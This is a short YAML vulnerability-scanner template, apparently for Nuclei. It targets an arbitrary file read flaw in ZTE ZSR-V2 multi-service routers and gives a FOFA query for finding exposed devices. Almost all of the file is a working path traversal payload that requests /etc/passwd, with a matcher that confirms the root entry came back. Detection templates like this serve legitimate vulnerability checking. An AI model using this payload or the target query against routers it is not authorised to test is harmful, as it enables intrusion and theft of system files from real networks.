id: zte-zsr-v2-fileread
info:
  name: 中兴 ZTE-ZSR-V2 系列多业务路由器 - fileread
  author: leadlife
  severity: high
  description: 中兴ZTE-ZSR-V2系列多业务路由器存在任意文件读取漏洞，任意文件下载漏洞可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E4%B8%AD%E5%85%B4/%E4%B8%AD%E5%85%B4ZTE-ZSR-V2%E7%B3%BB%E5%88%97%E5%A4%9A%E4%B8%9A%E5%8A%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: title="ZSRV2路由器Web管理系统"
  tags: 2024,fileread,zte

http:
  - method: GET
    path:
      - "{{BaseURL}}/css//../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200